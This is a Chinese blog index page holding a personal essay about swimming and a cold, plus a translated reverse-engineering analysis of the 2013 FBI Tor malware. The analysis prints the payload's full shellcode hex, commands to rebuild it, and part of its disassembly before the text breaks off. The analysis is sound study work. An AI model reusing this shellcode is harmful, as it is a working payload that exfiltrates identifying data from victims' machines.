<!doctype html>
<html class="theme-next   use-motion ">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />












  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>




  
    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
  



<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=0.4.5.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Reverland, Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/images/default_avatar.jpg?v=0.4.5.2" />






<meta name="description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta property="og:type" content="website">
<meta property="og:title" content="Reverland的行知阁">
<meta property="og:url" content="http://reverland.org/page/5/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Reverland的行知阁">
<meta name="twitter:description" content="我希望生活是诗的，是画的，是无数动听的音符。我希望我是自由的，摇滚的，有一颗黑客的心。">



<script type="text/javascript" id="hexo.configuration">
  var CONFIG = {
    scheme: '',
    sidebar: 'post',
    motion: true
  };
</script>

  <title> Reverland的行知阁 </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  <!--[if lte IE 8]>
  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
           style='margin-left:auto;margin-right:auto;display: block;'/>
    </a>
  </div>
<![endif]-->
  






  <div class="container one-column 
   page-home 
">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Reverland的行知阁</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
  <p class="site-subtitle">开放、分享、自由与进步</p>
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu ">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-tags fa-fw"></i> <br />
            
            标签
          </a>
        </li>
      

      
      
    </ul>
  

  
</nav>

 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div id="content" class="content">
          
  <section id="posts" class="posts-expand">

    

    
    
      
      

      
    

    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/life/2014/08/26//" itemprop="url">
                  希望
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-26T00:00:00+08:00" content="2014-08-26">
              2014-08-26
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/life/" itemprop="url" rel="index">
                    <span itemprop="name">life</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/life/2014/08/26//#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="life/2014/08/26//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <blockquote>
<p>“I am looking at the future with concern, but with good hope.”</p>
<p>Albert Schweitzer</p>
</blockquote>
<p>希望就像北京夏日的晚风，感受到，却无法捕捉，就像萦绕在空气中的思绪。</p>
<p>我数了数，就要感冒第九天了吧。</p>
<h2 id="I">I</h2><p>下午从寝室睡醒，迷迷糊糊地爬起来去实验室。</p>
<p>走在路上，阳光好炽烈，炽烈得好像世界马上就要融化了，灰飞烟灭，不复存在。</p>
<p>抬头看着科研楼的玻璃幕墙映出下午的蓝天白云，恍恍惚惚就像梦境一样。</p>
<p>就这么如行尸走肉般走进实验室了。</p>
<p>实验室总管大人坐在我的位置背后，看到我出现后问，你这是间歇性上班么。</p>
<p>嗯。</p>
<p>我没有看她，喝了一口水，坐下来，继续搬砖。</p>
<p>完全不想理人。</p>
<p>完全在想另外一些事：</p>
<p>明天，还下不了水么。</p>
<h2 id="II">II</h2><p>清晨，对面窗户的反光直愣愣地射到床上。</p>
<p>我睁开眼看了看，映入脑海的第一个消息是个坏消息：</p>
<p>还感冒着。</p>
<p>时间总是过得飞快，不管你喜欢它还是不愿接受，世界还是会毫不留情地从你的挽留前碾压过去。</p>
<p>上班时迷迷糊糊，走到面前才看到是组长大人。</p>
<p>进了电梯，她提起周末组内活动的事。</p>
<p>我说，晚上吃饭，我就下午去游泳。</p>
<p>她说，你不跟我们一起桌游了么，游泳换个时间游。</p>
<p>不，能游泳的日子一分都不想放过。</p>
<p>她没再说什么，似乎不高兴的样子，或者是我有些愧疚。</p>
<p>然而也没心情管这些，她应该明白我是什么样的人。</p>
<p>明天能下水吗？</p>
<h2 id="III">III</h2><p>我就是个疯子。</p>
<p>从来没掩饰过自己是多么看重游泳这件事。</p>
<p>我说过，头可断，血可流，泳不能不游。</p>
<p>我说，我来帝都，就有一个目的，能在学校里以低成本游泳。仅此一条就够了，我不在乎上什么学、毕什么业、将来找它什么工作。</p>
<p>所以，凡是阻碍游泳的都是敌人，凡是一起游泳的都是朋友。</p>
<p>游泳时碰到个信安的将毕业师兄，说到想休学一年或者退学旅行，我说我也想退学或者休学啊，想了都不是一次两次了。师兄问我，你退学干嘛？我不知道干啥，我只知道我有一大堆想干的但没法尽说，只知道一件事是肯定的，我要留在这里游泳！</p>
<p>游泳时才仿佛找到了自己，跳出了狭小而熟悉的圈子，拥抱更丰富多彩的世界。</p>
<p>暑假的一周假期，过得恍恍惚惚，莫名奇妙地就结束了。</p>
<p>几乎是从家里逃回了学校，原因之一就是无法忍受，不能下水的日子。</p>
<p>回校那天下午刚到，晚上就迫不及待游泳去了。</p>
<p>喂，就是这样。</p>
<p>大概如果，某天实验室要求我去哪个没法游泳的地方，即使再好，</p>
<p>大概我会决绝地拒绝过去。</p>
<p>大概有人如果跟我讲游泳怎么怎么不好或者想歪了的都会有种与之友尽的冲动。</p>
<p>其实现在已经在想工作之后的事。</p>
<p>从来只看眼前不看将来的我竟然在游泳这件事上能往后想十年。</p>
<p>然而回校没几天，就从师姐那里知悉了个悲剧。</p>
<p>学校的游泳馆整修关门，不知道什么时候开门。</p>
<h1 id="IV">IV</h1><p>不管怎样，泳是一定要游的。</p>
<p>拿出社工的技术把周遭所有游泳馆的信息几乎检查一遍。</p>
<p>北师、北交、北航、首体、水立方、人大、北外、英东……</p>
<p>去了北师几趟，1.4米的深水差点摔蒙。</p>
<p>差点去遍游北京各大高校……</p>
<p>后来怎么回事一起去了次人大，大家就选择人大了。</p>
<p>于是有了现在的“每晚攻占人大小分队”，我却掉队了……</p>
<p>那是和ZQ攻占人大后的当晚，嗓子疼得难以入眠，爬起来跑到阳台上</p>
<p>看着远处电光雷影，却听不到一点雷声。</p>
<p>然后就感冒了。那是周日晚</p>
<p>周一和父亲打电话，父亲问我还游泳么。我说，哦，如果明天没啥事就去。父亲说，还是等好了再去吧。</p>
<p>周二，我知道四天内是没指望了。晚上碰到DD，问周末要不要一起去。我真希望，而且以为周末感冒会好。</p>
<p>周三，请了一天假在寝室郁闷。希望周五就能下水了。</p>
<p>周四，呵呵了，希望周五感冒就好了。</p>
<p>周五，妹的，希望周六能下水。</p>
<p>周六，跟AS从西土城徒步到奥园，晚上洗澡时感觉随时都要倒下。我知道周日下水的美梦破灭了。</p>
<p>周日，DD还惦念着送了我一大袋子梨，我以为她就说说……然后我还厚颜无耻地收下了……额……心里太温暖了。晚上去北理和本科室友扯淡……直觉周一能下水的希望又破灭了。</p>
<p>周一，唉……但愿明天感冒好了</p>
<p>周二，花擦。</p>
<h2 id="V">V</h2><p>不管怎样，有得必有失，有失必有得。</p>
<p>结果是，准备弹一学期的歌可能用不了一学期了。</p>
<p>终于知道学校的洗澡堂是什么样的了。</p>
<p>我在想，我这个疯子，很多事该放弃了。毕竟，Don’t take the world upon your shoulders.</p>
<p>该想想怎么爱他人，就像他人对我的爱一样。</p>
<p>来帝都那天，收到妹妹的祝福短信。你们生日我都没记住过T T，连父母都不知道该送什么礼物好，你们难过伤心的时候我也无能为力地在暗处看着，听着，却不知道该做什么说什么。我只想远远得逃开，反正留着也没用。</p>
<p>人情是温暖的，也是沉重的。有这么些时候，就想默默地淡去。</p>
<p>但不想终其一生都是在逃避，无论是碧水中、网络上、琴弦里、还是色彩变换的光影里。</p>
<p>终究要面对，所有害怕的、不愿接受的、不喜欢的，该来的早晚来。</p>
<p>但我还想在水里逍遥一会儿。</p>
<h2 id="VI">VI</h2><p>虽然以上都是瞎扯的，但为了保证身体健康和心理健康，不知道明天能不能下水……估计得后天了，唉……</p>
<blockquote>
<p>Hey Jude, Don’t be afraid.</p>
<p>You are made to, go out and get her.</p>
<p>The minute you let it under your skins.</p>
<p>Then you begin to make it better.</p>
<p>Any time you feel the pain.</p>
<p>Hey Jude, refrain.</p>
<p>Don’t carry the world upon your shoulders.</p>
</blockquote>
<p>Na-nananananananannanananananananananananananannanananananananana</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/uncategorized/2014/08/14/fbi-tor-malware-analysis/" itemprop="url">
                  FBI Tor Malware analysis(意译整理)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-14T00:00:00+08:00" content="2014-08-14">
              2014-08-14
            </time>
          </span>

          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/uncategorized/2014/08/14/fbi-tor-malware-analysis/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="uncategorized/2014/08/14/fbi-tor-malware-analysis/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>感想：</p>
<p>先说说，逆向真累，得一点点跟着函数流前进探索。靠反汇编引擎可不靠谱，跟着流程才是王道啊。</p>
<p>注释真是非常重要，为何要用IDA真是一目了然啊</p>
<p>来源：</p>
<ul>
<li><a href="http://ghowen.me/fbi-tor-malware-analysis/" target="_blank" rel="external">Analysis of the FBI Tor Malware</a></li>
<li><a href="https://www.virustotal.com/en/file/74414c3397dc0de10fbe0adedb7f033028fe4bb57ac4f51784a6df1a7b0114f0/analysis/" target="_blank" rel="external">Virustotal</a></li>
<li><a href="http://pastebin.com/aFUP2gLB" target="_blank" rel="external">Freedom Hosting FBI Shellcode Payload..</a></li>
<li><a href="http://www.blizzhackers.cc/viewtopic.php?f=52&amp;t=496643&amp;start=15" target="_blank" rel="external">Re:”Remembering ‘08” Remembering Tor</a></li>
<li><a href="http://pastebin.com/K61QZpzb" target="_blank" rel="external">redirector</a></li>
<li><a href="http://pastebin.com/GZ1Kg3cb" target="_blank" rel="external">infector</a></li>
<li><a href="http://pastebin.com/gVna4pi2" target="_blank" rel="external">shellcode</a></li>
</ul>
<p>Tor是一个让人们不被追踪地浏览网页和获取服务的匿名网络。作为这个网络的一部分，存在所谓的“<a href="http://www.zhihu.com/question/22759179" target="_blank" rel="external">暗网</a>”。这些网络只能通过Tor连接。虽然很多服务是无辜的或者抵制人权滥用，网络的匿名性也吸引了有目的的犯罪比如儿童色情。法律机构<a href="http://en.wikipedia.org/wiki/Tor\_(anonymity_network" target="_blank" rel="external">无法</a>#Hidden_services)追踪到源IP地址。</p>
<p>2013年，在Freedom Hosting的暗网服务器上发现了一个恶意程序，该程序挖掘特定浏览器的漏洞并在用户计算机上执行程序。该程序搜集用户信息并发送到Virginia的服务器，然后使浏览器崩溃。它没有明显的恶意程序特征。因此有猜测这个程序是在Virginia有办公室的的FBI制作的。FBI<a href="http://en.wikipedia.org/wiki/Computer_and_Internet_Protocol_Address_Verifier" target="_blank" rel="external">有权编写恶意程序</a>。看起来这个猜测是<a href="http://www.wired.com/threatlevel/2013/09/freedom-hosting-fbi/" target="_blank" rel="external">真的</a>。现在已经确认为FBI代号为<a href="http://cryptome.org/2013/10/nsa-egotisticalgiraffe.pdf" target="_blank" rel="external"> EgotisticalGiraffe</a>的作品。</p>
<h2 id="逆向之">逆向之</h2><h3 id="漏洞挖掘程序">漏洞挖掘程序</h3><p>漏洞挖掘程序是javascript写的，挖掘了一个特定版本firefox的已知bug。挖掘程序经过充分混淆但是快速扫描能找到很长的16进制字符串，在前几个字符能明显看到操作符(通常在shellcode开头有jmp或者call，知道这一点就很容易找到shellcode了)。</p>
<p>首先，攻击者在网页中嵌入了一个链接向恶意页面的<code>iframe</code>，将受害者定向到感染页面。参见这里<a href="http://pastebin.com/bu2Ya0n6" target="_blank" rel="external">Freedom Hosting FBI IFRAME Redirector Malware Script</a>。</p>
<p>在受害者被重定向到真正的感染页面后，在三个iframe之间执行js，进一步混淆执行流程。最终触发漏洞，注入shellcode。参见<a href="http://pastebin.com/RTwsyrH8" target="_blank" rel="external">Freedom Hosting FBI Malware Infector (ForPayload) JavaScript</a></p>
<p>js那部分就不说了，我们看看shellcode。</p>
<h3 id="位置独立代码">位置独立代码</h3><p>shellcode必须直接注入进程运行。它不知道自己会被注入到什么位置，也不知道Windows API函数的地址。</p>
<p>因此，必须想些办法获取这些信息。FBI的这个程序使用了一个找到地址的常用方法：</p>
<pre><code><span class="built_in">call</span> start
<span class="keyword">star</span><span class="variable">t:</span>
<span class="keyword">pop</span> ebp
</code></pre><p><code>call start</code>做了两件事，首先，把下一个要执行的指令的地址即<code>pop ebp</code>的地址压入栈，然后跳转到<code>start</code>标签位置，就是继续执行<code>pop ebp</code>。再执行完<code>pop ebp</code>后，<code>pop ebp</code>的地址就存入了<code>ebp</code>寄存器。以此为标准就能获取shellcode中的其它数据。</p>
<h3 id="定位Windows_API">定位Windows API</h3><p>译者：啊啊啊啊啊，都忘记这部分怎么回事了。大家可以看看</p>
<ul>
<li><a href="http://projectshellcode.com/?q=node/12" target="_blank" rel="external">Project shellcode上的教程</a>。</li>
<li>有本专讲win32 shellcode的书<a href="nologin.org/Downloads/Papers/win32-shellcode.pdf">Understanding Windows Shellcode</a></li>
<li><a href="http://www.codeproject.com/Articles/325776/The-Art-of-Win-Shellcoding" target="_blank" rel="external">The Art of Win32 Shellcoding</a></li>
</ul>
<p>应用程序知道Windows载入的API在哪里，但shellcode不会知道。常见方法是查看<code>fs</code>寄存器指向的<a href="http://en.wikipedia.org/wiki/Win32_Thread_Information_Block" target="_blank" rel="external">线程信息块(TIB)</a>.通过这个结构可以定位宿主程序DLL函数的位置，遍历DLL导出表知道找到函数。此过程非常无聊，所以FBI都使用了Metasploit项目<a href="https://github.com/iagox86/nbtool/blob/master/samples/shellcode-win32/block_api.asm" target="_blank" rel="external">Stephen Fewer的函数解析器</a>。</p>
<pre><code><span class="keyword">push</span> arguments
...
<span class="keyword">push</span> FUNCTIONHASH
<span class="keyword">call</span> Stephen的解析器
</code></pre><p>函数哈希通过对函数名简单的哈希算法实现，你可以用别人做好的<a href="http://scriptjunkie1.110mb.com/hashes/index.html" target="_blank" rel="external">哈希表</a>,可以用别人的哈希计算<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/hash.py" target="_blank" rel="external">程序</a>，甚至<a href="http://projectshellcode.com/node/21" target="_blank" rel="external">自己在shellcode中计算</a>。</p>
<h2 id="开始">开始</h2><p>首先先获取shellcode吧，把以下一堆hex保存到<code>input.txt</code>里</p>
<pre><code>60FCE<span class="number">88A00000060</span><span class="number">89E531D26</span><span class="number">48B52308B52</span><span class="number">0C8B52148</span>B72280FB74A2631FF31C0AC<span class="number">3C617C02</span>2C20C1CF<span class="number">0D01C7E2</span>F<span class="number">052578B52</span><span class="number">108B423C01</span>D<span class="number">08B407885</span>C<span class="number">0744A01D05</span><span class="number">08B48188B58</span><span class="number">2001D3E33</span>C<span class="number">498B348</span>B01D631FF31C0ACC1CF<span class="number">0D01C738</span>E<span class="number">075F4037</span>DF<span class="number">83B7D2475</span>E<span class="number">2588B58240</span><span class="number">1D3668B0</span>C<span class="number">4B8B581</span>C<span class="number">01D38B048</span>B<span class="number">01D08944242</span><span class="number">45B5B61595</span>A51FFE<span class="number">0585F5A8</span>B12EB<span class="number">86055D81</span>BDE<span class="number">90200004745</span><span class="number">542075708</span>D<span class="number">85D102000050</span><span class="number">684C77260</span>7FFD<span class="number">585C0745</span>E<span class="number">8D85D80200</span><span class="number">0050684C77</span>2607FFD<span class="number">585C0744</span>CBB<span class="number">9001000029</span>DC<span class="number">54536829806</span>B00FFD501DC<span class="number">85C07536505</span><span class="number">05050405040</span>5068EA0FDFE0FFD531DBF<span class="number">7D339C37</span><span class="number">41F89C36A108</span>DB<span class="number">5E102000056</span><span class="number">536899A57</span>461FFD<span class="number">585C0741</span>FFE<span class="number">8D89000000</span>75E380BD<span class="number">4F02000001</span><span class="number">7407E83B01</span>0000EB<span class="number">05E84D01000</span>0FFE<span class="number">7B80001000</span><span class="number">029C489</span>E<span class="number">252505268B64</span>9DE01FFD<span class="number">55F81C40001</span><span class="number">000085C00</span>F<span class="number">85F200000057</span>E<span class="number">8F90000005</span>E89CA8DBDE<span class="number">9020000E8</span>EB<span class="number">0000004F83</span>FA207C05BA<span class="number">2000000089</span>D<span class="number">156F3A4B90</span>D<span class="number">0000008</span>DB<span class="number">5C4020000</span>F3A489BD<span class="number">4B0200005</span>E<span class="number">5668A92834</span>80FFD<span class="number">585C00F84</span>AA<span class="number">000000668</span>B<span class="number">480A6683</span>F<span class="number">9040F829</span>C<span class="number">0000008D40</span><span class="number">0C8B008</span>B<span class="number">088B09B80</span><span class="number">00100005089</span>E<span class="number">729C489</span>E<span class="number">657565151684</span><span class="number">872D2B8</span>FFD<span class="number">585C081</span>C<span class="number">4040100000</span>FB<span class="number">70F83F90672</span>6CB<span class="number">906000000</span>B<span class="number">81000000029</span>C<span class="number">489E789</span>CAD<span class="number">1E2505231D28</span><span class="keyword">A</span><span class="number">1688D024</span>F<span class="number">0C0E8043</span>C<span class="number">0977040430</span>EB<span class="number">02043788074</span><span class="number">788D0240</span>F<span class="number">3C09770404</span>30EB<span class="number">02043788074</span><span class="number">746E2D45</span>929CF89FE5801C48BBD<span class="number">4B020000</span>F<span class="number">3A4C6854</span>F<span class="number">02000001E82</span>E<span class="number">00000031C05</span>05129CF<span class="number">4F575368</span>C2EB385FFFD<span class="number">55368756E4</span>D61FFD5E9C8FEFFFF<span class="number">31C9F7D131</span>C0F2AEF<span class="number">7D149C30000</span><span class="number">0000008</span>DBDE<span class="number">9020000E8</span>E4FFFFFF4FB<span class="number">94F0000008</span>DB<span class="number">575020000</span>F3A48DBDE<span class="number">9020000E8</span>CBFFFFFFC<span class="number">30D0A436</span>F<span class="number">6E6E65637</span><span class="number">4696F6E3</span><span class="keyword">A</span><span class="number">206B6565702</span>D<span class="number">616C69766</span><span class="number">50D0A41636</span><span class="number">36570743A202</span><span class="keyword">A</span><span class="number">2F2A0D0</span><span class="keyword">A</span><span class="number">41636365707</span><span class="number">42D456E63</span><span class="number">6F64696E67</span><span class="number">3A20677A69</span><span class="number">700D0A0</span>D<span class="number">0A0083C70</span>E<span class="number">31C9F7D131</span>C0F3AE4FFFE<span class="number">70D0A436</span>F<span class="number">6F6B69653</span><span class="keyword">A</span><span class="number">2049443D77</span><span class="number">73325F333200</span><span class="number">4950484C50</span><span class="number">415049000200</span>005041DECA<span class="number">36474554202</span>F<span class="number">303563656134</span><span class="number">64652D39353</span><span class="number">1642D34303</span><span class="number">3372D62663</span><span class="number">8662D66363</span><span class="number">93035356232</span><span class="number">37396262204</span><span class="number">85454502F31</span><span class="number">2E310D0</span><span class="keyword">A</span><span class="number">486F73743</span><span class="keyword">A</span><span class="number">200000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">0000090</span>
</code></pre><p>然后使用<code>xxd</code>转化为二进制文件。</p>
<pre><code>$ xxd -r -<span class="tag">p</span> hex_input<span class="class">.txt</span> magneto<span class="class">.payload</span><span class="class">.shellcode</span>
$ ls -al magneto<span class="class">.payload</span><span class="class">.shellcode</span>
-rw-r--r-- <span class="number">1</span> reverland reverland <span class="number">956</span> Aug <span class="number">14</span> <span class="number">19</span>:<span class="number">29</span> magneto<span class="class">.payload</span><span class="class">.shellcode</span>
$ sha256sum magneto<span class="class">.payload</span><span class="class">.shellcode</span>
<span class="number">74414</span>c3397dc0de10fbe0adedb7f033028fe4bb57ac4f51784a6df1a7b0114f0  magneto<span class="class">.payload</span><span class="class">.shellcode</span>
</code></pre><p>首先反汇编shellcode：</p>
<pre><code> ~/Work/project/reverse/<span class="keyword">test</span> ⮀ <span class="literal">r2</span> -b <span class="number">32</span> -k w32 -a x86 magneto.payload.shellcode
 -- Everything <span class="preprocessor">up</span>-to-date.
[<span class="number">0x00000000</span>]&gt; pD <span class="number">956</span>
            <span class="number">0x00000000</span>    <span class="number">60</span>           <span class="keyword">pushad</span>
            <span class="number">0x00000001</span>    fc           <span class="keyword">cld</span>
            <span class="number">0x00000002</span>    e88a000000   <span class="keyword">call</span> <span class="number">0x91</span>
               <span class="number">0x00000091</span>(unk)
            <span class="number">0x00000007</span>    <span class="number">60</span>           <span class="keyword">pushad</span>
            <span class="number">0x00000008</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
            <span class="number">0x0000000a</span>    31d2         <span class="keyword">xor</span> <span class="literal">edx</span>, <span class="literal">edx</span>
            <span class="number">0x0000000c</span>    648b5230     <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">fs</span>:<span class="literal">edx</span>+<span class="number">0x30</span>]
            <span class="number">0x00000010</span>    8b520c       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">edx</span>+<span class="number">0xc</span>]
            <span class="number">0x00000013</span>    8b5214       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">edx</span>+<span class="number">0x14</span>]
   .------&gt; <span class="number">0x00000016</span>    8b7228       <span class="keyword">mov</span> <span class="literal">esi</span>, [<span class="literal">edx</span>+<span class="number">0x28</span>]
   |        <span class="number">0x00000019</span>    0fb74a26     <span class="keyword">movzx</span> <span class="literal">ecx</span>, <span class="preprocessor">word</span> [<span class="literal">edx</span>+<span class="number">0x26</span>]
   |        <span class="number">0x0000001d</span>    31ff         <span class="keyword">xor</span> <span class="literal">edi</span>, <span class="literal">edi</span>
   |   .--&gt; <span class="number">0x0000001f</span>    31c0         <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
   |   |    <span class="number">0x00000021</span>    ac           <span class="keyword">lodsb</span>
   |   |    <span class="number">0x00000022</span>    3c61         <span class="keyword">cmp</span> <span class="literal">al</span>, <span class="number">0x61</span>
   |   |,=&lt; <span class="number">0x00000024</span>    7c02         <span class="keyword">jl</span> <span class="number">0x28</span>
   |   ||   <span class="number">0x00000026</span>    2c20         <span class="keyword">sub</span> <span class="literal">al</span>, <span class="number">0x20</span>
   |   |<span class="string">`-&gt; 0x00000028    c1cf0d       ror edi, 0xd
   |   |    0x0000002b    01c7         add edi, eax
   |   `</span>==&lt; <span class="number">0x0000002d</span>    e2f0         <span class="keyword">loop</span> <span class="number">0x1f</span>
   |        <span class="number">0x0000002f</span>    <span class="number">52</span>           <span class="keyword">push</span> <span class="literal">edx</span>
   |        <span class="number">0x00000030</span>    <span class="number">57</span>           <span class="keyword">push</span> <span class="literal">edi</span>
   |        <span class="number">0x00000031</span>    8b5210       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">edx</span>+<span class="number">0x10</span>]
   |        <span class="number">0x00000034</span>    8b423c       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">edx</span>+<span class="number">0x3c</span>]
   |        <span class="number">0x00000037</span>    01d0         <span class="keyword">add</span> <span class="literal">eax</span>, <span class="literal">edx</span>
   |        <span class="number">0x00000039</span>    8b4078       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">eax</span>+<span class="number">0x78</span>]
   |        <span class="number">0x0000003c</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
   |  ,===&lt; <span class="number">0x0000003e</span>    744a         <span class="keyword">je</span> <span class="number">0x8a</span>
   |  |     <span class="number">0x00000040</span>    01d0         <span class="keyword">add</span> <span class="literal">eax</span>, <span class="literal">edx</span>
   |  |     <span class="number">0x00000042</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
   |  |     <span class="number">0x00000043</span>    8b4818       <span class="keyword">mov</span> <span class="literal">ecx</span>, [<span class="literal">eax</span>+<span class="number">0x18</span>]
   |  |     <span class="number">0x00000046</span>    8b5820       <span class="keyword">mov</span> <span class="literal">ebx</span>, [<span class="literal">eax</span>+<span class="number">0x20</span>]
   |  |     <span class="number">0x00000049</span>    01d3         <span class="keyword">add</span> <span class="literal">ebx</span>, <span class="literal">edx</span>
   |.-----&gt; <span class="number">0x0000004b</span>    e33c         <span class="keyword">jecxz</span> <span class="number">0x89</span>
   || |     <span class="number">0x0000004d</span>    <span class="number">49</span>           <span class="keyword">dec</span> <span class="literal">ecx</span>
   || |     <span class="number">0x0000004e</span>    8b348b       <span class="keyword">mov</span> <span class="literal">esi</span>, [<span class="literal">ebx</span>+<span class="literal">ecx</span>*<span class="number">4</span>]
   || |     <span class="number">0x00000051</span>    01d6         <span class="keyword">add</span> <span class="literal">esi</span>, <span class="literal">edx</span>
   || |     <span class="number">0x00000053</span>    31ff         <span class="keyword">xor</span> <span class="literal">edi</span>, <span class="literal">edi</span>
   ||.----&gt; <span class="number">0x00000055</span>    31c0         <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
   ||||     <span class="number">0x00000057</span>    ac           <span class="keyword">lodsb</span>
   ||||     <span class="number">0x00000058</span>    c1cf0d       <span class="keyword">ror</span> <span class="literal">edi</span>, <span class="number">0xd</span>
   ||||     <span class="number">0x0000005b</span>    01c7         <span class="keyword">add</span> <span class="literal">edi</span>, <span class="literal">eax</span>
   ||||     <span class="number">0x0000005d</span>    38e0         <span class="keyword">cmp</span> <span class="literal">al</span>, <span class="number">ah</span>
   ||<span class="string">`====&lt; 0x0000005f    75f4         jne 0x55
   || |     0x00000061    037df8       add edi, [ebp-0x8]
   || |     0x00000064    3b7d24       cmp edi, [ebp+0x24]
   |`</span>=====&lt; <span class="number">0x00000067</span>    75e2         <span class="keyword">jne</span> <span class="number">0x4b</span>
   |  |     <span class="number">0x00000069</span>    <span class="number">58</span>           <span class="keyword">pop</span> <span class="literal">eax</span>
   |  |     <span class="number">0x0000006a</span>    8b5824       <span class="keyword">mov</span> <span class="literal">ebx</span>, [<span class="literal">eax</span>+<span class="number">0x24</span>]
   |  |     <span class="number">0x0000006d</span>    01d3         <span class="keyword">add</span> <span class="literal">ebx</span>, <span class="literal">edx</span>
   |  |     <span class="number">0x0000006f</span>    668b0c4b     <span class="keyword">mov</span> <span class="literal">cx</span>, [<span class="literal">ebx</span>+<span class="literal">ecx</span>*<span class="number">2</span>]
   |  |     <span class="number">0x00000073</span>    8b581c       <span class="keyword">mov</span> <span class="literal">ebx</span>, [<span class="literal">eax</span>+<span class="number">0x1c</span>]
   |  |     <span class="number">0x00000076</span>    01d3         <span class="keyword">add</span> <span class="literal">ebx</span>, <span class="literal">edx</span>
